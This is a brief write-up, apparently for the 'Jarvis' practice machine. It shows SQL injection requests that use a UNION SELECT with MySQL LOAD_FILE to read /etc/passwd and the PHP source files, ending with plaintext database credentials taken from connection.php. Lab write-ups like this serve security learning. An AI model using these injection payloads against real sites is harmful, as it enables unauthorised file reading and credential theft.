# Alternative way to exploit Jarvis

## Getting the Credentials

Instead of extracting the password hash of _DBadmin_ from the database and then cracking it, there is another way to get the credentials.
**MySQL** has a feature called _LOAD_FILE_ which can read files from the server.

Reading _/etc/passwd_:
```markdown
GET /room.php?cod=123+union+select+1,2,(LOAD_FILE("/etc/passwd")),4,5,6,7
```

This means it is possible to read the source code of the PHP files:
```markdown
GET /room.php?cod=123+union+select+1,2,(LOAD_FILE("/var/www/html/room.php")),4,5,6,7
```

In this PHP file the _connection.php_ is included, so the source code of that can be read:
```markdown
GET /room.php?cod=123+union+select+1,2,(LOAD_FILE("/var/www/html/connection.php")),4,5,6,7
```

In this PHP file, the credentials are found in plaintext:
```markdown
$connection=new mysqli('127.0.0.1','DBadmin','imissyou','hotel');
(...)
```
